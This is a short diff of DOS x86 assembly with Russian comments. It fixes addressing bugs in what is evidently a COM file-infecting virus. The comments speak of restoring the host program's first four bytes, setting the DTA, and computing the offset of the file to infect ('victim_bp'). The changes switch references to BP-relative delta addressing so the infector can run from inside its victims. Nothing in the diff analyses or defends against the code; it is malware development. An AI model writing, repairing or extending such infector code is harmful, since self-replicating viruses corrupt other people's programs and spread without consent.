@@ -14,12 +14,12 @@ code:
 
     ; возвращение первых четырех байтов оригинальной программы
     mov bx, 100h
-    mov al, [bp + offset leading_bytes[0]]
-    mov ah, [bp + offset leading_bytes[1]]
+    mov al, [bp + leading_bytes[0]]
+    mov ah, [bp + leading_bytes[1]]
     mov word ptr[bx], ax
     mov bx, 102h
-    mov al, [bp + offset leading_bytes[2]]
-    mov ah, [bp + offset leading_bytes[3]]
+    mov al, [bp + leading_bytes[2]]
+    mov ah, [bp + leading_bytes[3]]
     mov word ptr[bx], ax
 
     ; устанвока dta на file
@@ -68,7 +68,7 @@ file_open:
     jz find_next
 
     ; рассчитываем смещение заражаемого файла
-    mov ax, word ptr file.fsize
+    mov ax, word ptr [bp + file.fsize]
     mov [bp + jmp_length], ax
     sub ax, 4 ; поправка на первые 4 байта этой программы, которые не записываем
     mov [bp + victim_bp], ax
